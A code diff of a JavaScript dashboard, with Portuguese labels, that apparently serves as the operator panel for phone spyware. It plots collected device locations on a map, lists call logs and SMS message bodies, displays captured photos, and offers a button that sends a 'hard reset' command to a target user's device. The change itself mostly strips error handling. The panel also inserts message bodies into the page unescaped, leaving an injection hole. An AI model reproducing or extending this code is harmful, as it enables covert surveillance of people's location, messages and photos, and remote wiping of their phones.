@@ -1,6 +1,6 @@
 const API = window.location.origin + '/api';
 const token = localStorage.getItem('token');
-if (!token) return window.location.href = 'index.html';
+if (!token) location.href = 'index.html';
 
 const logoutBtn    = document.getElementById('logout');
 const refreshBtn   = document.getElementById('refresh');
@@ -8,106 +8,69 @@ const hardResetBtn = document.getElementById('hardReset');
 
 logoutBtn.onclick = () => {
   localStorage.removeItem('token');
-  window.location.href = 'index.html';
+  location.href = 'index.html';
 };
-
 refreshBtn.onclick = loadData;
-
 hardResetBtn.onclick = async () => {
   const user = JSON.parse(atob(token.split('.')[1])).username;
-  try {
-    const res = await fetch(`${API}/command/${encodeURIComponent(user)}`, {
-      method: 'POST',
-      headers: { Authorization: 'Bearer ' + token }
-    });
-    const json = await res.json();
-    alert('Hard-Reset enviado: ' + JSON.stringify(json));
-  } catch (e) {
-    alert('Erro no hard-reset: ' + e.message);
-  }
+  await fetch(`${API}/command/${user}`, {
+    method: 'POST',
+    headers: { Authorization: 'Bearer ' + token }
+  });
+  alert('Hard-Reset enviado');
 };
 
 let map, markers = [];
+document.addEventListener('DOMContentLoaded', () => {
+  map = L.map('map').setView([0, 0], 2);
+  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    attribution: '© OpenStreetMap'
+  }).addTo(map);
+  loadData();
+});
 
 async function loadData() {
-  try {
-    const res = await fetch(`${API}/data`, {
-      headers: { Authorization: 'Bearer ' + token }
+  markers.forEach(m=>map.removeLayer(m));
+  markers = [];
+  document.querySelector('#callsTable tbody').innerHTML = '';
+  document.querySelector('#smsTable tbody').innerHTML   = '';
+  document.getElementById('photos').innerHTML           = '';
+
+  const res = await fetch(`${API}/data`, {
+    headers: { Authorization: 'Bearer ' + token }
+  });
+  const pts = await res.json();
+  if (!pts.length) return alert('Nenhum dado disponível.');
+
+  pts.forEach(entry => {
+    const { lat, lng, date } = entry.location;
+    const marker = L.marker([lat, lng]).addTo(map)
+      .bindPopup(`Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>${new Date(date).toLocaleString()}`);
+    markers.push(marker);
+
+    entry.calls.forEach(c => {
+      const tr = `<tr>
+        <td>${c.number}</td><td>${c.type}</td>
+        <td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td>
+      </tr>`;
+      document.querySelector('#callsTable tbody').innerHTML += tr;
     });
-    if (!res.ok) throw new Error(`HTTP ${res.status}`);
-    const pts = await res.json();
 
-    // limpa marcadores antigos
-    markers.forEach(m => map.removeLayer(m));
-    markers = [];
+    entry.sms.forEach(s => {
+      const tr = `<tr>
+        <td>${s.from}</td><td>${s.body}</td>
+        <td>${new Date(s.date).toLocaleString()}</td>
+      </tr>`;
+      document.querySelector('#smsTable tbody').innerHTML += tr;
+    });
 
-    if (pts.length === 0) {
-      alert('Nenhum dado coletado ainda.');
-      return;
+    if (entry.photo) {
+      const img = document.createElement('img');
+      img.src = 'data:image/jpeg;base64,' + entry.photo;
+      document.getElementById('photos').appendChild(img);
     }
+  });
 
-    // centraliza no primeiro ponto
-    const first = pts[0].location;
-    map.setView([first.lat, first.lng], 13);
-
-    // limpa tabelas e fotos
-    document.querySelector('#callsTable tbody').innerHTML = '';
-    document.querySelector('#smsTable tbody').innerHTML   = '';
-    document.getElementById('photos').innerHTML           = '';
-
-    pts.forEach(entry => {
-      // popup no mapa
-      const { lat, lng, time } = entry.location;
-      const popupContent = `
-        <b>${entry.username}</b><br>
-        Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>
-        Hora: ${new Date(time).toLocaleString()}
-      `;
-      const marker = L.marker([lat, lng]).addTo(map)
-        .bindPopup(popupContent);
-      markers.push(marker);
-
-      // chamadas
-      entry.calls.forEach(call => {
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-          <td>${call.number}</td>
-          <td>${call.type}</td>
-          <td>${call.duration}</td>
-          <td>${new Date(call.date).toLocaleString()}</td>
-        `;
-        document.querySelector('#callsTable tbody').appendChild(tr);
-      });
-
-      // sms
-      entry.sms.forEach(sms => {
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-          <td>${sms.from}</td>
-          <td>${sms.body}</td>
-          <td>${new Date(sms.date).toLocaleString()}</td>
-        `;
-        document.querySelector('#smsTable tbody').appendChild(tr);
-      });
-
-      // fotos (base64)
-      if (entry.photo) {
-        const img = document.createElement('img');
-        img.src = 'data:image/jpeg;base64,' + entry.photo;
-        document.getElementById('photos').appendChild(img);
-      }
-    });
-  } catch (e) {
-    alert('Erro ao carregar dados: ' + e.message);
-    console.error(e);
-  }
+  const first = pts[0].location;
+  map.setView([first.lat, first.lng], 13);
 }
-
-// inicializa o mapa
-map = L.map('map').setView([0, 0], 2);
-L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-  attribution: '© OpenStreetMap'
-}).addTo(map);
-
-// carrega dados inicialmente
-loadData();
